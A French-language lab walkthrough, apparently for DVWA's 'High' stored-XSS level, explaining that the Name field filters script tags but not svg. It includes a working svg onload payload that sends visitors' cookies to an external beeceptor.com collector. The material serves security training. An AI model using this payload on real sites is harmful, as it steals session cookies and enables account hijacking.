# Niveau "High"

Ici contrairement au niveau "Medium", le champ "Name" semble posséder un filtrage plus fort que le champ "Message" car plus rien ne s'affiche mis à part un malheureux petit chevron `">"` :

![](../../../../.gitbook/assets/2448376e94cf4ccfb07b40a5ca550901.png)

Si le filtrage s'effectue seulement sur les balises `<script>` `</script>`, il est fort probable que la balise `<svg>` soit toujours utilisable :

![](../../../../.gitbook/assets/1c414ec534804f56590077f87b46f6a6.png)

C'est bien le cas, on ajoute notre payload de vol de cookies :

```markup
<svg onload="fetch('https://dvwaxssrefl.free.beeceptor.com?cookie=' + document.cookie);">
```

![](../../../../.gitbook/assets/93fdbc43b069de2a852b36435ee8ef1e.png)

Lorsqu'un visiteur lira le message, notre serveur malicieux listera les cookies reçues :

![](../../../../.gitbook/assets/6ac757d465641780b382d68c799f214f.png)

